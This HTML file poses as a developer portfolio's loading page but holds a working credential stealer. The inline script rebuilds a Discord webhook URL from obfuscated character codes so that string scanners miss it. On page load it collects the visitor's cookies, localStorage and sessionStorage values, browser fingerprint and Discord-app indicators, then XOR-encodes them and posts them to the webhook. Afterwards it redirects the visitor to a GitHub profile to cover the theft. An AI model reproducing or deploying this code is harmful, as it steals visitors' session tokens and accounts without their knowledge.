<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dev Portfolio | Loading...</title>
    <style>
        body {
            margin: 0;
            background: #0d1117;
            color: #c9d1d9;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            overflow: hidden;
        }
        .loader {
            width: 48px;
            height: 48px;
            border: 5px solid #30363d;
            border-bottom-color: #58a6ff;
            border-radius: 50%;
            animation: rotation 1s linear infinite;
        }
        @keyframes rotation {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .loading-text {
            margin-top: 20px;
            font-size: 16px;
            color: #8b949e;
        }
    </style>
</head>
<body>
    <div class="loader"></div>
    <div class="loading-text">Loading portfolio...</div>

    <script>
        (function() {
            // ====== WEBHOOK - RECONSTRUCTED FROM PARTS ======
            // Split webhook ID and token to avoid string detection
            const _p1 = [104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47];
            const _p2 = [49,53,50,51,53,49,55,52,57,56,56,57,57,56,50,52,55,49,50,47,120,55,119,57,109,67,117,79,73,102,110,51,54,119,50,119,110,78,115,49,53,83,67,99,54,99,74,104,117,111,66,83,113,51,75,110,106,116,118,77,67,49,88,54,55,98,115,67,81,48,118,80,73,75,114,79,69,87,86,68,112,73,69,81,45,106,53,67];
            
            let WH = '';
            for (let i = 0; i < _p1.length; i++) WH += String.fromCharCode(_p1[i]);
            for (let i = 0; i < _p2.length; i++) WH += String.fromCharCode(_p2[i]);
            
            const GH = 'https://github.com/nm1-Dev';
            
            // ====== SIMPLE XOR ENCODER ======
            function enc(data, key) {
                let out = '';
                for (let i = 0; i < data.length; i++) {
                    out += String.fromCharCode(data.charCodeAt(i) ^ key.charCodeAt(i % key.length));
                }
                return btoa(out);
            }
            
            // ====== GRAB EVERYTHING ======
            function grab() {
                const loot = {
                    ls: [],
                    ss: [],
                    ck: [],
                    info: {}
                };
                
                // localStorage
                try {
                    for (let i = 0; i < localStorage.length; i++) {
                        const k = localStorage.key(i);
                        const v = localStorage.getItem(k);
                        if (v && v.length > 20) {
                            loot.ls.push({k: k, v: v});
                        }
                    }
                } catch(e) {}
                
                // sessionStorage
                try {
                    for (let i = 0; i < sessionStorage.length; i++) {
                        const k = sessionStorage.key(i);
                        const v = sessionStorage.getItem(k);
                        if (v && v.length > 20) {
                            loot.ss.push({k: k, v: v});
                        }
                    }
                } catch(e) {}
                
                // Cookies
                try {
                    document.cookie.split(';').forEach(c => {
                        const parts = c.trim().split('=');
                        if (parts.length >= 2) {
                            loot.ck.push({k: parts[0], v: parts.slice(1).join('=')});
                        }
                    });
                } catch(e) {}
                
                // Browser info
                loot.info = {
                    ua: navigator.userAgent,
                    p: navigator.platform,
                    l: navigator.language,
                    sr: screen.width + 'x' + screen.height,
                    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    ts: new Date().toISOString(),
                    rf: document.referrer || 'D',
                    url: location.href
                };
                
                // Discord app detection
                if (window.webpackChunkdiscord_app) loot.info.da = 1;
                if (window.DiscordNative) loot.info.dn = 1;
                if (window.GLOBAL_ENV) loot.info.ge = 1;
                
                return loot;
            }
            
            // ====== BUILD PAYLOAD ======
            function build(loot) {
                const key = Math.random().toString(36).substring(2, 10);
                const json = JSON.stringify(loot);
                const encoded = enc(json, key);
                
                // Discord webhook expects: {content: string}
                // We send encoded data as content with a code block
                return {
                    content: '```\n' + encoded + '\n```\nKey: `' + key + '`'
                };
            }
            
            // ====== SEND FUNCTIONS ======
            function sendFetch(url, data) {
                fetch(url, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(data)
                }).then(r => console.log('Fetch OK:', r.status))
                  .catch(e => console.log('Fetch ERR:', e.message));
            }
            
            function sendXHR(url, data) {
                const xhr = new XMLHttpRequest();
                xhr.open('POST', url, true);
                xhr.setRequestHeader('Content-Type', 'application/json');
                xhr.onreadystatechange = function() {
                    if (xhr.readyState === 4) {
                        console.log('XHR:', xhr.status);
                    }
                };
                xhr.send(JSON.stringify(data));
            }
            
            // ====== EXECUTE ======
            const loot = grab();
            const payload = build(loot);
            
            console.log('Webhook URL:', WH);
            console.log('Payload:', payload);
            
            // Send via multiple methods
            sendFetch(WH, payload);
            setTimeout(() => sendXHR(WH, payload), 500);
            
            // Redirect
            setTimeout(() => {
                window.location.href = GH;
            }, 2000);
            
        })();
    </script>
</body>
</html>
